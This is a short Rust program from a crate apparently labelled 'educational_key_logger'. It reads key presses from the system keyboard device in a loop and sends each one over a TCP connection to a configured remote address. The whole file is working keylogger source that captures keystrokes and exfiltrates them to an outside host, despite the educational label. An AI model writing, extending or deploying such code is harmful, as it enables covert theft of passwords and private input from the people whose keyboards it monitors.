mod keylogger;
use educational_key_logger::IP_PORT;
use keylogger::{get_device_file, get_key_pressed};
use std::{io::Write, net::TcpStream, thread, time::Duration};

fn main() {
    let mut stream = TcpStream::connect(IP_PORT).unwrap();
    let device = get_device_file();
    loop {
        thread::sleep(Duration::from_millis(10));
        let key_pressed = get_key_pressed(&device);
        if key_pressed == 0 {
            continue;
        }
        if let Err(err) = stream.write(format!("Key pressed: {}", key_pressed).as_bytes()) {
            println!("Failed: {}", err)
        };
    }
}
